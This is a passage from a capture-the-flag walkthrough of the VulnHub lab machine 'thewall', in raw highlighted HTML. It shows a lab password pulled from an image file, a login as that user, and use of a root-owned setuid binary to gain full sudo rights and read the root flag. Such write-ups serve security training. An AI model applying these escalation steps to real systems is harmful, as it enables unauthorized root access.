</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">28</span> 05:16 .ssh
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> DavidGilmour  DavidGilmour   384B Aug  <span class="m">8</span> 00:33 anotherbrick.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour  1022B Oct <span class="m">26</span> 08:59 bio.txt
</span><span class='line'>-rwxr<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   178K Oct <span class="m">28</span> 08:50 david_gilmour_profile_pic.jpg
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   785B Oct <span class="m">27</span> 01:43 mbox
</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p>In order to get full priviledge of use <code>DavidGilmour</code>, I did some enumeration and there is a jpg file in David&rsquo;s home directory. By checking the jpg file <code>david_gilmour_profile_pic.jpg</code> with <code>strings</code>, I found the password on the bottom: <font color="red"><code>who_are_you_and_who_am_i</code></font>.</p>

<p>Now, login to David with his password.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>login: DavidGilmour
</span><span class='line'>Password:
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>DavidGilmour
</span></code></pre></td></tr></table></div></figure></p>

<p>After some enumeration, I found new clues in the file <code>anotherbrick.txt</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat anotherbrick.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;New website <span class="k">for</span> review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;You have to be trusted by the people you lie to. So that when they turn their backs on you, you<span class="p">&amp;</span>rsquo<span class="p">;</span>ll get the chance to put the knife in. - Pink Floyd, Dogs&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Checking the new web page, this is the home page of 50 years of Pink Floyd.</p>

<p><img class="left" src="/downloads/the_wall/2.png"></p>

<p>After some testing with the new web page, could not find any attacking point, so I downloaded the picture and have a close look.</p>

<p>There are something hidden in it, by increasing the brightness of the picture, the hidden strings become more and more clearly.</p>

<p><img class="left" src="/downloads/the_wall/homepageimg_x.jpg"></p>

<p>From the picture, we got a folder or a path <code>/welcometothemachine</code> and a key <code>50696e6b466c6f796435305965617273</code>.</p>

<p>By searching the keyword <code>welcometothemachine</code>, I found a sticky file which is owned by root!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>find / -name <span class="p">&amp;</span>lsquo<span class="p">;</span>welcometothemachine<span class="p">&amp;</span>rsquo<span class="p">;</span> 2&gt;/dev/null
</span><span class='line'>/var/www/htdocs/welcometothemachine
</span><span class='line'><span class="nv">$ </span>ls -al /var/www/htdocs/welcometothemachine
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root  welcometothemachine   <span class="m">512</span> Aug  <span class="m">8</span> 00:33 .
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">4</span> www   welcometothemachine   <span class="m">512</span> Nov <span class="m">27</span> 01:47 ..
</span><span class='line'>-rws<span class="p">&amp;</span>ndash<span class="p">;</span>s<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">1</span> root  welcometothemachine  <span class="m">7513</span> Nov <span class="m">27</span> 01:47 PinkFloyd
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After run the file <code>PinkFloyd</code> and input the answer <code>50696e6b466c6f796435305965617273</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/var/www/htdocs/welcometothemachine/PinkFloyd
</span><span class='line'>Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
</span><span class='line'>Answer: 50696e6b466c6f796435305965617273&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Congratulations<span class="p">&amp;</span>hellip<span class="p">;</span> permission has been granted.
</span><span class='line'>You can now <span class="nb">set </span>your controls to the heart of the sun!
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Notice the sentence: <font color="red"><code>Congratulations... permission has been granted.</code></font> by checking the sudo file, we are now can run any command as any users including ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo -l
</span><span class='line'>Password:
</span><span class='line'>Matching Defaults entries <span class="k">for</span> DavidGilmour on thewall:
</span><span class='line'>    env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;User DavidGilmour may run the following commands on thewall:
</span><span class='line'>    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
</span></code></pre></td></tr></table></div></figure></p>

<p>Now catch the Flag!!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo ls -al /root
</span><span class='line'>total 48
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">5</span> root  wheel   <span class="m">512</span> Nov <span class="m">27</span> 02:04 .
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root  wheel   <span class="m">512</span> Oct <span class="m">24</span> 18:03 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel    <span class="m">87</span> Aug <span class="m">16</span> 18:25 .Xdefaults
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel   <span class="m">578</span> Aug <span class="m">16</span> 18:25 .cshrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel    <span class="m">94</span> Aug <span class="m">16</span> 18:25 .cvsrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel   <span class="m">328</span> Aug <span class="m">16</span> 18:25 .login
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel   <span class="m">468</span> Aug <span class="m">16</span> 18:25 .profile
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">2</span> root  wheel   <span class="m">512</span> Nov <span class="m">27</span> 05:01 .ssh
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root  wheel  <span class="m">2739</span> Nov <span class="m">27</span> 01:07 flag.txt
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root  wheel   <span class="m">512</span> Nov <span class="m">14</span> 02:43 scripts
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root  wheel   <span class="m">512</span> Oct <span class="m">27</span> 03:10 tmp
</span><span class='line'><span class="nv">$ </span>sudo cat /root/flag.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;               Congratulations on rooting thewall!
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt; <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/strong&gt;  &lt;/strong&gt;&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="p">|</span>  <span class="o">)</span>      /         <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; <span class="p">|</span>,<span class="p">&amp;</span>rsquo<span class="p">;</span> , .  <span class="p">|</span> <span class="p">|</span> _ , &lt;/em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      ,<span class="p">|</span>   <span class="p">|</span> <span class="p">|</span><span class="se">\ </span><span class="p">|</span> <span class="p">|</span> ,<span class="p">&amp;</span>lsquo<span class="p">;</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;__ <span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span> _ <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|&amp;</span>lsquo<span class="p">;</span><span class="se">\ </span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="se">\ </span> &lt;em&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>  &lt;code&gt;<span class="p">|</span>  <span class="se">\ </span>    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_  ,-<span class="s1">&#39;_ _____ | _______|_______|_______|_____|</span>
</span><span class='line'><span class="s1">  | |       |       |   ,-&#39;</span><span class="p">|</span>  _     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>__  ,-<span class="p">|</span>-<span class="s1">&#39; |  ,-. \ /_.--. _____|_______|_______|_|</span>
</span><span class='line'><span class="s1">  |     |       |          |   |  | |  V  |   ) |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|_______|_ | _ |-&#39;</span>&lt;/code&gt;-<span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="p">|</span>  <span class="p">|</span> ,<span class="p">&amp;</span>lsquo<span class="p">;</span> &lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      <span class="p">|</span>        <span class="p">|</span>  <span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="p">;&amp;</span>lsquo<span class="p">;</span>        <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">&amp;</span>ldquo<span class="p">;|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;  &lt;/em&gt;,- o<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       &lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>    .       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; &lt;/em&gt;,<span class="p">&amp;</span>ndash<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="se">\ </span>     &lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">&amp;</span>rsquo<span class="p">;</span>     <span class="o">||</span>&lt;/em&gt;<span class="o">||</span>-<span class="p">&amp;</span>lsquo<span class="p">;</span> _   <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; <span class="o">||</span> <span class="o">||</span>,-<span class="p">&amp;</span>rsquo<span class="p">;</span>  &lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>  <span class="o">||</span>&lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;.<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;.&lt;/strong&gt;  &lt;/em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="se">\ </span>   <span class="p">|</span>     /        <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;&lt;strong&gt; <span class="se">\ </span>&lt;/strong&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt; /,  _ <span class="p">|</span>   <span class="p">|</span> &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="se">\ </span>     // <span class="se">\ </span>  <span class="p">|</span>   <span class="p">|</span>   <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; <span class="se">\ </span>/<span class="se">\ </span>//<span class="p">&amp;</span>ndash<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="se">\ </span> <span class="p">|</span>   <span class="p">|</span> &lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">&amp;</span>lsquo<span class="p">;</span>  V/    <span class="p">|</span>  <span class="p">|</span>-<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span>&lt;/strong&gt;,    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt; &lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;              Celebrating <span class="m">50</span> years of Pink Floyd!
</span><span class='line'>         Syd Barrett <span class="o">(</span>RIP<span class="o">)</span>, Nick Mason, Roger Waters,
</span><span class='line'>           Richard Wright <span class="o">(</span>RIP<span class="o">)</span>, and David Gilmour.
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;strong&gt; Shoutouts &lt;/strong&gt;
</span><span class='line'>+ @vulnhub <span class="k">for</span> making it all possible
</span><span class='line'>+ @rastamouse @thecolonial - <span class="p">&amp;</span>ldquo<span class="p">;</span>the <span class="nb">test </span>bunnies<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-<span class="o">=========================================</span>-
</span><span class='line'>-  xerubus <span class="o">(</span>@xerubus - www.mogozobo.com<span class="o">)</span>  -
</span><span class='line'>-<span class="o">=========================================</span>-
